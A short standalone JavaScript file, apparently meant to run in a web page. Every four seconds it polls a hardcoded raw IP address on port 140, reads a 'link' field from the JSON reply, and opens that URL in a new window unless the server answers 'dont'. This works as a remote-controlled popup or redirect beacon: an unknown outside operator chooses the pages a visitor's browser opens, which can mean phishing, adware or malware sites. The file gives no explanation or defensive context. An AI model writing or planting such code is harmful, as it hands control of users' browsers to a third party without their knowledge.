

var secfuc = function() {
  c = 5+3;
}

var main = function(){
  var request = new XMLHttpRequest();
  request.open('GET','http://83.251.19.73:140/');
  request.onload = function(){
    var data = JSON.parse(request.responseText);
    link = data['link'];
    if(link == "dont"){void(0);console.log("okey im chilling now");}else{window.open(link);}
  };
  request.send();
  setTimeout(main, 4000);
}

main();
